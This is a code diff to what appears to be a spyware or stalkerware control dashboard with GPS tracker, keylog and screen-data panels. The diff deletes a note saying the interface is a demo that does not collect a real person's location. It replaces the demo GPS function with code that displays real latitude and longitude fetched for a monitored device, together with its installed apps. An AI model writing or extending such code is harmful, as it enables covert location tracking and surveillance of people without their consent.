@@ -363,7 +363,7 @@ body {
     </section>
 
 
-    <!-- GPS DEMO -->
+    <!-- GPS PANEL (Real Data) -->
 
     <section class="panel gps-box" id="gpsPanel">
 
@@ -373,7 +373,7 @@ body {
                 📍 GPS Tracker
             </div>
 
-            <button class="refresh" onclick="demoGPS()">
+            <button class="refresh" onclick="loadDeviceInfo()">
                 ⟳ Refresh
             </button>
 
@@ -385,13 +385,12 @@ body {
                 LOCATION STATUS
             </div>
 
-            <div class="gps-value">
-                Demo location — waiting for authorized device location
+            <div class="gps-value" id="gpsValue">
+                No location data yet.
             </div>
 
-            <div class="demo-note">
-                This interface is a demonstration and does not collect
-                or transmit a real person's location.
+            <div class="demo-note" id="gpsNote">
+                Waiting for device location...
             </div>
 
         </div>
@@ -487,6 +486,8 @@ function showGPS(button) {
     document.getElementById("gpsPanel").style.display = "block";
     document.getElementById("keylogPanel").style.display = "none";
     document.getElementById("screenPanel").style.display = "none";
+
+    loadDeviceInfo();
 }
 
 function showKeylog(button) {
@@ -515,14 +516,7 @@ function showScreenData(button) {
     refreshScreenData();
 }
 
-function demoRefresh() {
-    loadDeviceInfo();
-}
-
-function demoGPS() {
-    alert("Demo GPS: no real location is being collected.");
-}
-
+// Load device info (including GPS)
 async function loadDeviceInfo() {
     const deviceId = getDeviceId();
     document.getElementById("deviceIdDisplay").innerHTML = `DEVICE ID: <b>${escapeHtml(deviceId)}</b>`;
@@ -546,13 +540,28 @@ async function loadDeviceInfo() {
             document.getElementById("deviceStatusText").className = "";
         }
 
+        // Render installed apps
         renderInstalledApps(data.installedApps || []);
+
+        // Update GPS
+        if (data.latitude && data.longitude) {
+            document.getElementById("gpsValue").innerHTML =
+                `Latitude: ${data.latitude.toFixed(6)}<br>Longitude: ${data.longitude.toFixed(6)}`;
+            document.getElementById("gpsNote").textContent =
+                "Location updated at " + new Date(data.last_seen).toLocaleTimeString();
+        } else {
+            document.getElementById("gpsValue").textContent = "No location data yet.";
+            document.getElementById("gpsNote").textContent = "Waiting for device location...";
+        }
+
     } catch (e) {
         console.error(e);
         document.getElementById("deviceName").textContent = "📱 Error loading device info";
         document.getElementById("batteryLevel").textContent = "—";
         document.getElementById("deviceStatusText").textContent = "Error";
         document.getElementById("installedAppsList").innerHTML = `<div class="app">Failed to load apps</div>`;
+        document.getElementById("gpsValue").textContent = "Error loading location.";
+        document.getElementById("gpsNote").textContent = "";
     }
 }
 
